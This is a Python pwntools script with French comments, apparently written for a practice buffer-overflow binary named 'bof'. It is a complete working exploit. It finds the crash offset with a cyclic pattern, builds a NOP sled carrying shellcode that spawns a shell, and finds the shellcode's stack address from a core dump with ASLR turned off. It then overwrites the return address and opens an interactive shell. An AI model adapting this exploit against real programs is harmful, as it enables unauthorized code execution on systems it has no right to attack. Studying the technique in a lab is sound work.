#!/usr/bin/env python3
from pwn import *

target="./binaries/bin/bof"
context.update(arch='amd64', os='linux') 

context.binary = elf = ELF(target)
context.log_level = "info"          # repasse en "debug" si besoin
context.terminal = ["konsole", "-e"]

shellcode = asm(shellcraft.sh())


p = process([target, cyclic(200, n=8)], aslr=False)
p.wait()
offset = cyclic_find(p.corefile.fault_addr, n=8)
log.success("offset = %d", offset)          # attendu : 136


padding = b"A" * 56
nop_len = offset - len(shellcode) - len(padding)
assert nop_len >= 0, "shellcode + padding depassent l'offset"
payload = b"\x90" * nop_len + shellcode + padding
assert len(payload) == offset

crash = payload + b"\x41" * 6
p = process([target, crash], aslr=False)
p.wait()
core = p.corefile



shellcode_addr = None
for addr in core.search(shellcode):
    if core.stack.start <= addr < core.stack.stop:
        shellcode_addr = addr
        break
assert shellcode_addr is not None, "shellcode introuvable sur la pile"
log.success("shellcode @ %#x", shellcode_addr)


ret = p64(shellcode_addr)[:6]         
assert b"\x00" not in payload + ret, "il reste un nul dans argv !"
payload_final = payload + ret
assert len(payload_final) == len(crash)

log.info("payload_final = %d octets", len(payload_final))
print(hexdump(payload_final))

p = process([target, payload_final], aslr=False)
p.interactive()


